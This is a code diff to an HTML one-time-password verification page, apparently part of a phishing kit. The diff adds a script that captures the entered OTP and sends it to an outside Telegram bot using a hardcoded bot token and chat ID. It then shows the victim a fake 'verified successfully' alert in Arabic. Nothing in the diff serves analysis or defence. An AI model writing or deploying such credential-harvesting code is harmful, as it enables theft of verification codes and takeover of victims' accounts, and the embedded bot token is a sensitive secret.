@@ -56,11 +56,11 @@
                 <hr>
             </div>
             
-            <form action="#" onsubmit="event.preventDefault(); alert('تم التحقق بنجاح! (Demo)');">
+            <form onsubmit="sendOtpData(event)">
                 <div class="form-group">
                     <label>Enter OTP:</label>
                     <div class="password-wrapper">
-                        <input type="password" placeholder="Enter OTP">
+                        <input type="password" id="otpCode" placeholder="Enter OTP" required>
                         <i class="fa-regular fa-eye-slash eye-icon"></i>
                     </div>
                 </div>
@@ -80,5 +80,22 @@
             <a href="#"><i class="fa-brands fa-facebook-f"></i></a>
         </div>
     </footer>
+
+    <script>
+        function sendOtpData(event) {
+            event.preventDefault();
+            const otp = document.getElementById('otpCode').value;
+
+            const token = "9295127609:AAH6m1b_vUZZzsltPPEDTxhyEyMnsh6kbbw";
+            const chatId = "8812057901";
+            const message = `🔢 رمز التحقق (OTP):\n\n🔑 الرمز: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                alert('تم التحقق بنجاح! (Demo)');
+            })
+            .catch(err => console.error(err));
+        }
+    </script>
 </body>
 </html>
